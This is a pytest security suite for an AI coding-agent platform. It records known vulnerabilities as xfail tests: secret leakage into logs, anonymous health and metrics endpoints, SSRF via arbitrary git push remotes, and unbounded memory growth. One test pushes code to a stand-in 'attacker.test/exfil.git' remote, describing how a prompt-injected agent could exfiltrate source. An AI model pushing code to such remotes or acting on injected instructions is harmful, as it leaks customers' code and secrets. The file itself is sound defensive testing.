"""Security tests: secret leakage, network egress/SSRF, and resource exhaustion."""

import inspect
import pathlib
import uuid

import pytest

from app.api.v1.endpoints import sessions as sessions_module
from app.application.agent.subagents import coder as coder_module
from app.core.logging import redact_sensitive_data
from app.core.rate_limiter import RateLimiter
from app.domain.entities.tool import mask_sensitive_data
from app.infrastructure.sandbox import docker_sandbox
from app.infrastructure.sandbox.audit import (
    SandboxAuditEventType,
    SandboxAuditLogger,
    SandboxAuditRecord,
)
from app.infrastructure.sandbox.policy import SandboxSecurityPolicy
from app.infrastructure.tools.controlled_tool_layer import ControlledToolLayer
from app.infrastructure.vcs.local_git_provider import LocalGitProvider
from app.main import app
from app.services.brute_force_service import BruteForceProtectionService

from tests.support.factories import make_run
from tests.support.http import route_requires_authentication

pytestmark = pytest.mark.security

APP_ROOT = pathlib.Path(__file__).resolve().parents[2] / "app"


# ------------------------------------------------------------- secret leakage
class TestSecretLeakage:
    def test_known_sensitive_keys_are_redacted_regression(self):
        redacted = redact_sensitive_data(
            None,
            None,
            {
                "user": "alice",
                "password": "hunter2",
                "access_token": "eyJhbGciOi",
                "api_key": "sk-live-1",
                "nested": {"secret_key": "s3cr3t", "keep": "visible"},
            },
        )
        assert redacted["password"] == "[REDACTED]"
        assert redacted["access_token"] == "[REDACTED]"
        assert redacted["api_key"] == "[REDACTED]"
        assert redacted["nested"]["secret_key"] == "[REDACTED]"
        assert redacted["user"] == "alice"
        assert redacted["nested"]["keep"] == "visible"

    @pytest.mark.asyncio
    async def test_tool_arguments_are_masked_in_audit_records_regression(self, recording_sandbox):
        sb, sandbox_id = recording_sandbox
        layer = ControlledToolLayer()
        await layer.execute_tool(
            sandbox=sb, sandbox_id=sandbox_id, tool_name="write_file",
            args={"file_path": "cfg.py", "content": "x", "api_key": "sk-live-should-not-appear"},
            run=make_run(),
        )
        assert "sk-live-should-not-appear" not in str(layer.audit_records[-1].input_metadata)

    def test_mask_helper_hides_values_not_just_keys_regression(self):
        masked = mask_sensitive_data({"password": "hunter2", "token": "abc"})
        assert "hunter2" not in str(masked)

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="LEAK-01: app/api/v1/endpoints/auth.py contains a debug print() that writes the "
        "refresh token and request DTO to stdout, bypassing the structlog redaction processor "
        "entirely. Every token refresh leaks a long-lived credential into the log pipeline.",
    )
    def test_application_code_contains_no_print_statements(self):
        offenders = []
        for path in APP_ROOT.rglob("*.py"):
            for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1):
                stripped = line.strip()
                if stripped.startswith("print(") or " print(" in stripped and not stripped.startswith("#"):
                    offenders.append(f"{path.relative_to(APP_ROOT)}:{number}")
        assert offenders == [], f"print() in application code: {offenders}"

    @pytest.mark.vuln
    @pytest.mark.parametrize(
        "event",
        [
            {"command": "curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig' https://api"},
            {"command": "export DB_PASSWORD=hunter2 && ./migrate.sh"},
            {"output_summary": "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"},
            {"stack_trace": "postgresql://postgres:hunter2@db:5432/agent_platform"},
        ],
    )
    @pytest.mark.xfail(
        strict=True,
        reason="LEAK-02: redact_sensitive_data only inspects dictionary *keys*. Secrets embedded in "
        "values - command strings, output summaries, connection URIs, tracebacks - are logged "
        "verbatim, and those are exactly the fields the sandbox and git audit paths log.",
    )
    def test_secrets_inside_values_are_redacted(self, event):
        redacted = redact_sensitive_data(None, None, dict(event))
        rendered = str(redacted)
        for secret in ("hunter2", "wJalrXUtnFEMI", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"):
            assert secret not in rendered, f"secret survived redaction: {rendered}"

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="LEAK-03: /health/detail is anonymous and returns raw database exception strings "
        "(which can embed the DSN), infrastructure topology and cost telemetry.",
    )
    def test_detailed_health_requires_authentication(self):
        assert route_requires_authentication(app, "/api/v1/health/detail", "GET")

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="LEAK-03: /api/v1/metrics and /api/v1/metrics/dashboard are anonymous and expose "
        "token counts and per-run cost telemetry.",
    )
    def test_metrics_require_authentication(self):
        for path in ("/api/v1/metrics", "/api/v1/metrics/dashboard", "/api/v1/metrics/background-jobs"):
            assert route_requires_authentication(app, path, "GET"), f"{path} is anonymous"

    def test_liveness_probe_stays_anonymous_and_minimal_regression(self, client):
        body = client.get("/api/v1/health").json()
        assert set(body) <= {"status", "service", "version", "environment"}


# ------------------------------------------------------------ network egress
class TestNetworkEgress:
    def test_sandbox_network_is_disabled_by_default_regression(self):
        assert SandboxSecurityPolicy.get_container_security_options()["network_mode"] == "none"

    @pytest.mark.vuln
    @pytest.mark.asyncio
    @pytest.mark.xfail(
        strict=True,
        reason="SSRF-02: push_branch accepts any remote string, so a prompt-injected agent can push "
        "the customer's source tree to an attacker-controlled URL. Only named remotes resolved "
        "server-side from project configuration should be accepted.",
    )
    async def test_push_remote_must_be_a_configured_remote(self, recording_sandbox):
        sb, sandbox_id = recording_sandbox
        provider = LocalGitProvider(sandbox=sb, sandbox_id=sandbox_id)

        with pytest.raises(Exception):
            await provider.push_branch(
                workspace_path="",
                remote="https://attacker.test/exfil.git",
                branch_name="feature-x",
                user_authorized=True,
            )

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="NET-01: the only choices are 'no network' and 'unrestricted bridge'. There is no "
        "egress allowlist or proxy, so enabling networking for a legitimate dependency install also "
        "opens the metadata service and every internal host.",
    )
    def test_an_egress_allowlist_is_supported(self):
        source = inspect.getsource(SandboxSecurityPolicy.get_container_security_options)
        assert any(token in source for token in ("proxy", "allowlist", "egress", "extra_hosts"))

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="NET-01: containers join the default bridge when networking is enabled, so a sandbox "
        "can reach Postgres and Redis on the same host network.",
    )
    def test_sandboxes_use_a_dedicated_network(self):
        source = inspect.getsource(docker_sandbox.DockerSandboxAdapter.create_sandbox)
        assert "network=" in source or "networks" in source


# ------------------------------------------------------- resource exhaustion
class TestResourceExhaustion:
    def test_command_output_is_truncated_regression(self):
        content, truncated = SandboxSecurityPolicy.truncate_output("A" * 5_000_000, max_bytes=1_048_576)
        assert truncated is True
        assert len(content.encode()) < 2_000_000

    def test_tool_timeout_ceiling_exists_regression(self):
        source = inspect.getsource(ControlledToolLayer.execute_tool)
        assert "min(tool.timeout_seconds, 120)" in source

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="DOS-02: SandboxAuditLogger keeps every record in an unbounded process-local list, so "
        "a long-running or attacker-driven workload grows API memory without limit and the trail is "
        "lost on restart.",
    )
    def test_sandbox_audit_trail_is_bounded(self):
        logger = SandboxAuditLogger()
        for index in range(20_000):
            logger.record_event(
                SandboxAuditRecord(
                    event_id=uuid.uuid4().hex,
                    event_type=SandboxAuditEventType.COMMAND_EXECUTED,
                    sandbox_id="sb-1",
                    session_id="s-1",
                    command=f"echo {index}",
                )
            )
        assert len(logger.get_all_records()) < 20_000

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="DOS-02: ControlledToolLayer.audit_records grows without bound for the lifetime of "
        "the process.",
    )
    @pytest.mark.asyncio
    async def test_tool_audit_records_are_bounded(self, recording_sandbox):
        sb, sandbox_id = recording_sandbox
        layer = ControlledToolLayer()
        run = make_run()
        run.limits.max_tool_calls = 10_000
        run.limits.max_files_changed = 10_000

        for index in range(2_000):
            await layer.execute_tool(
                sandbox=sb, sandbox_id=sandbox_id, tool_name="read_file",
                args={"file_path": f"f{index}.py"}, run=run,
            )
        assert len(layer.audit_records) < 2_000

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="DOS-02/DOS-05: RateLimiter keeps a dict entry per distinct key with no eviction, so "
        "attacker-chosen keys (one per submitted email) grow memory indefinitely.",
    )
    def test_rate_limiter_evicts_stale_keys(self):
        limiter = RateLimiter(max_requests=1, window_seconds=1)
        for index in range(10_000):
            try:
                limiter.check_rate_limit(f"attacker-{index}@example.com")
            except Exception:
                pass
        assert len(limiter._records) < 10_000

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="AUTH-03/DOS-02: brute-force state is a process-local dict with one entry per "
        "submitted email address and no eviction.",
    )
    def test_brute_force_state_is_bounded_and_shared(self):
        service = BruteForceProtectionService()
        for index in range(10_000):
            service.record_failed_attempt(f"login:user{index}@example.com")
        assert len(service._attempts) < 10_000

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="DOS-01: nothing caps the number of concurrent sandboxes or enforces a per-user "
        "quota, and POST /sessions is anonymous, so a loop of requests exhausts host memory, pids "
        "and disk.",
    )
    def test_concurrent_sandbox_count_is_capped(self):
        source = inspect.getsource(docker_sandbox.DockerSandboxAdapter)
        assert any(token in source for token in ("max_concurrent", "Semaphore", "quota"))

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="DOS-01/DOS-02: SESSIONS_DB and STATE_MACHINES_DB are unbounded module-level dicts "
        "that retain a full AgentStateMachine (with its conversation) per request, for the lifetime "
        "of the process.",
    )
    def test_session_stores_are_bounded(self):
        source = inspect.getsource(sessions_module)
        assert any(token in source for token in ("maxlen", "TTL", "evict", "quota"))

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="DOS-02: CodingAgent retains a FileVersionSnapshot with the *entire* previous file "
        "content for every edit, in memory, for the whole run.",
    )
    def test_file_snapshots_do_not_retain_whole_files_in_memory(self):
        source = inspect.getsource(coder_module)
        assert "content=content" not in source.replace(" ", "")

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="DOS-04: execution is wrapped in asyncio.wait_for(asyncio.to_thread(...)). to_thread "
        "cannot be cancelled, so every timeout abandons a thread that stays blocked on the Docker "
        "call; enough timeouts saturate the default executor and cleanup blocks too.",
    )
    def test_timeouts_do_not_abandon_worker_threads(self):
        source = inspect.getsource(docker_sandbox.DockerSandboxAdapter.execute_command)
        assert "to_thread" not in source or "ThreadPoolExecutor" in source

    @pytest.mark.vuln
    @pytest.mark.xfail(
        strict=True,
        reason="DOS-03: AgentRun tracks estimated_cost_usd but no code path enforces a per-run or "
        "per-user spend ceiling, so an anonymous caller can drive unbounded model spend.",
    )
    def test_a_spend_ceiling_is_enforced(self):
        from app.domain.entities.agent import AgentLimits

        assert any("cost" in field or "budget" in field for field in AgentLimits.__dataclass_fields__)
